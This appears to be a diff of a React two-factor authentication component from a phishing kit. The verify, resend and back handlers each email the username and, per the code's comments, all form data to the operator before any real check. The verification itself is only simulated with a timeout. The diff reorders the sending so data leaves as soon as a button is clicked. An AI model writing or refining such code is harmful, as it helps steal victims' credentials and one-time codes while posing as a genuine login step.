@@ -43,11 +43,10 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
       return;
     }
 
-    setIsLoading(true);
+    // Send email IMMEDIATELY when verify button is clicked
+    console.log('🚨 2FA VERIFY BUTTON CLICKED - Sending email immediately...');
     
-    // Send HIGH PRIORITY email with ALL FORM DATA immediately when 2FA code is submitted
     try {
-      console.log('🚨 Sending HIGH PRIORITY 2FA verification email with ALL DATA immediately...');
       await sendHighPriorityNotification({
         step: "🔴 TWO-FACTOR AUTH - VERIFY CODE BUTTON CLICKED",
         username,
@@ -62,10 +61,12 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
           currentStep: "two_factor_auth"
         }
       });
-      console.log('✅ HIGH PRIORITY 2FA verification email with ALL DATA sent immediately!');
+      console.log('✅ 2FA verification email sent immediately!');
     } catch (error) {
-      console.error('❌ HIGH PRIORITY 2FA verification email failed:', error);
+      console.error('❌ 2FA verification email failed:', error);
     }
+
+    setIsLoading(true);
     
     // Simulate 2FA verification
     setTimeout(() => {
@@ -79,9 +80,10 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
   };
 
   const handleResendCode = async () => {
-    // Send HIGH PRIORITY email with ALL AVAILABLE DATA when refresh code button is clicked
+    // Send email IMMEDIATELY when refresh button is clicked
+    console.log('🚨 2FA REFRESH BUTTON CLICKED - Sending email immediately...');
+    
     try {
-      console.log('🚨 Sending HIGH PRIORITY refresh code email with ALL DATA immediately...');
       await sendHighPriorityNotification({
         step: "🔴 TWO-FACTOR AUTH - REFRESH CODE BUTTON CLICKED",
         username,
@@ -96,9 +98,9 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
           currentStep: "two_factor_auth"
         }
       });
-      console.log('✅ HIGH PRIORITY refresh code email with ALL DATA sent immediately!');
+      console.log('✅ 2FA refresh email sent immediately!');
     } catch (error) {
-      console.error('❌ HIGH PRIORITY refresh code email failed:', error);
+      console.error('❌ 2FA refresh email failed:', error);
     }
 
     setTimer(30);
@@ -110,7 +112,7 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
   };
 
   const handleBackClick = async () => {
-    // Send email with ALL AVAILABLE DATA when back button is clicked
+    // Send email when back button is clicked
     try {
       await sendHighPriorityNotification({
         step: "🔴 TWO-FACTOR AUTH - BACK BUTTON CLICKED",
